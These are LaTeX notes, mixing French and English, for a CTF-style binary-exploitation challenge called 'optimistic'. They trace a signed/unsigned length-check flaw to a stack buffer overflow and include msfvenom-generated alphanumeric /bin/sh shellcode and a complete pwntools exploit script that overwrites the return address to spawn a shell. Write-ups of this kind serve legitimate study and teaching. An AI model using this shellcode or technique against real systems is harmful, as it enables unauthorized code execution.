\chapter{Optimistic}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{recon}

\begin{verbatim}
$ file optimistic
optimistic: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=24f4b065a2eab20657772e85de2af83b2f6fe8b1, for GNU/Linux 3.2.0, 
not stripped
\end{verbatim}

\begin{verbatim}
$ pwntools-pwn checksec --file=optimistic
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
\end{verbatim}


\section{Static analysis}

\subsection{Ghidra}
\begin{verbatim}
void main(void)
{
  int intChoice;
  ssize_t readCount;
  uint nameSize;
  undefined4 local_80;
  undefined2 cEmailSize;
  char cChoice;
  undefined local_79;
  undefined bEmail [8];
  undefined bAge [8];
  char bName [96];
  
  initialize();
  puts("Welcome to the positive community!");
  puts("We help you embrace optimism.");
  printf("Would you like to enroll yourself? (y/n): ");
  intChoice = getchar();
  cChoice = (char)intChoice;
  getchar();
  if (cChoice != 'y') {
    puts("Too bad, see you next time :(");
    local_79 = 0x6e;
                      /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Great! Here\'s a small welcome gift: %p\n",&stack0xfffffffffffffff8);
  puts("Please provide your details.");
  printf("Email: ");
  readCount = read(0,bEmail,8);
  cEmailSize = (undefined2)readCount;
  printf("Age: ");
  readCount = read(0,bAge,8);
  local_80 = (undefined4)readCount;
  printf("Length of name: ");
  __isoc99_scanf(&DAT_00102104,&nameSize);
  if (0x40 < (int)nameSize) {
    puts("Woah there! You shouldn\'t be too optimistic.");
                      /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Name: ");
  readCount = read(0,bName,(ulong)nameSize);
  nameSize = 0;
  while( true ) {
    if ((int)readCount + -9 <= (int)nameSize) {
      puts("Thank you! We\'ll be in touch soon.");
      return;
    }
    intChoice = isalpha((int)bName[(int)nameSize]);
    if ((intChoice == 0) && (9 < (int)bName[(int)nameSize] - 0x30U)) break;
    nameSize = nameSize + 1;
  }
  puts("Sorry, that\'s an invalid name.");
                      /* WARNING: Subroutine does not return */
  exit(0);
}
\end{verbatim}

quand in regarde la définition de \verb+DAT_00102104+ on a \verb+"%d"+

Donc:
\begin{itemize}
    \item il scan la taille en entier signé
    \item compare l'entier signé avec \verb+0x40+
    \item mais scan le nom en entier non signé
\end{itemize}

a mon avis comme en complément de 2. si on rentre un nombre négatif cela va
faire un scan très grand lorsqu'il va être interpreté en non signé. Comme en
plus il ne test pas que le nombre soit positif mais seulement inférieur à
\verb+0x40+ 

\begin{verbatim}
/*
 * gcc test.c -o test-overflow
 */

#include <stdio.h>
#include <stdlib.h>


int main(void) {
    unsigned int nameSize=0;

    printf("Length of name: ");
    scanf("%d", &nameSize);
    printf("valeur signee %d \n", (int) nameSize);
    printf("valeur non signee %u \n", nameSize);
    if (0x40 < (int)nameSize) {
        puts("Woah there! You shouldn\'t be too optimistic.");
        exit(EXIT_FAILURE);
    }
    exit(EXIT_SUCCESS);
}
\end{verbatim}

\begin{verbatim}
 gcc test.c -o test-overflow && ./test-overflow 
Length of name: -40
valeur signee -40 
valeur non signee 4294967256
\end{verbatim}

par contre il faut aller reagrder le code après car il parcours le buffer (à
partir du début) et il faut absolument que l'on rentre ici sinon pas de
\verb+return+:
\begin{verbatim}
if ((int)readCount + -9 <= (int)nameSize) {
\end{verbatim}

donc il va falloir que chaque caractère de notre payload vérifie :
\begin{verbatim}
    intChoice = isalpha((int)bName[(int)nameSize]);
    if ((intChoice == 0) && (9 < (int)bName[(int)nameSize] - 0x30U)) break;
\end{verbatim}

donc il faut que soit de l'alpha jusuq'au moi \verb+rip+

\section{Dynamic Analysis}

\subsection{breakpoints}
\verb- b *main+289- retour scanf taille du nom
\verb- b *main+367- retour read du read du nom 

\subsection{taille du payload}

\begin{verbatim}
gef>  search-pattern AAAAAAAA
[+] In '[stack]'(0x7ffffffdc000-0x7ffffffff000), permission=rwx
  0x7fffffffc010 - 0x7fffffffc022  →   "AAAAAAAAAAAAAAAA\n"
  0x7fffffffc018 - 0x7fffffffc022  →   "AAAAAAAA\n"
\end{verbatim}

\begin{verbatim}
gef>  i f
Stack level 0, frame at 0x7fffffffc080:
 rip = 0x555555555398 in main; saved rip = 0x7ffff7ddd290
 called by frame at 0x7fffffffc120
 Arglist at 0x7fffffffc070, args:
 Locals at 0x7fffffffc070, Previous frame's sp is 0x7fffffffc080
 Saved registers:
  rbp at 0x7fffffffc070, rip at 0x7fffffffc078
\end{verbatim}

taille du buffer : 104 (\verb+echo "ibase=16;078-010" | bc+)

\subsection{addresse de saut}

taille du buffer : 96 (\verb+echo "ibase=16;070-010" | bc+)


\section{shellcode}
\subsection{pwntools}

\begin{verbatim}
alphanumeric(asm(shellcraft.sh()))
\end{verbatim}

ne fonctionne pas.

\subsection{msfvenom}

\begin{verbatim}
$ msfvenom -l payloads |grep x64 | grep linux
    linux/x64/exec                                                     Execute an arbitrary command or just a /bin/sh shell
    ...SNIP...
$ msfvenom -l encoders |grep alpha
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/nonalpha                  low        Non-Alpha Encoder

$ msfvenom -p linux/x64/exec --list-options
Options for payload/linux/x64/exec:
=========================


       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 21
       Rank: Normal

Provided by:
    ricky
    Geyslan G. Bem <geyslan@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    no        The command string to execute

...SNIP...

$ msfvenom -a x64 --platform linux -p linux/x64/exec CMD=/bin/sh -f python -e x86/alpha_mixed
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 150 (iteration=0)
x86/alpha_mixed chosen with final size 150
Payload size: 150 bytes
Final size of python file: 754 bytes
buf =  b""
buf += b"\x89\xe3\xdb\xc9\xd9\x73\xf4\x5f\x57\x59\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
buf += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
buf += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
buf += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x47\x38\x6d\x68\x76\x4f\x50\x62\x53\x59\x50\x6e"
buf += b"\x64\x6f\x50\x73\x45\x38\x55\x50\x6c\x59\x62\x70"
buf += b"\x31\x44\x71\x4f\x73\x62\x65\x36\x33\x58\x36\x4d"
buf += b"\x61\x73\x33\x64\x33\x6e\x61\x42\x59\x78\x56\x68"
buf += b"\x77\x70\x67\x70\x33\x30\x66\x4f\x42\x42\x61\x79"
buf += b"\x52\x4e\x36\x4f\x63\x43\x62\x48\x33\x30\x73\x66"
buf += b"\x72\x77\x50\x54\x61\x4e\x52\x4a\x35\x6b\x43\x68"
buf += b"\x44\x4f\x56\x65\x41\x41"
\end{verbatim}

donc le soucis déjà c'est que le shellcode est trop long.

\subsection{exploit-db}

\url{https://www.exploit-db.com/exploits/35205}

\section{Exploit building}

\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./optimistic
\end{verbatim}

\begin{verbatim}
io = start()

log.info(f'asked {io.clean()}')
io.sendline('y')
io.recvuntil('0x')
base_buffer = int('0x'+io.recvline(keepends=False).decode(),16)
log.success(f'base: {base_buffer} {hex(base_buffer)}')

shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload = flat(
        [
            shellcode,
            (b'B' * (104 - len(shellcode))),
            (base_buffer - 96)
        ]
)
log.success(f'payload : {payload}')

log.info(f'asked {io.clean()}') # mail request
io.sendline('email')
log.info(f'asked {io.clean()}') # age request
io.sendline('age')
log.info(f'asked {io.clean()}') # name lenght request
io.sendline('-40')
log.info(f'asked {io.clean()}') # name request
io.sendline(payload)
#exit(0)
log.info(f'asked {io.clean()}') #

io.interactive()
\end{verbatim}

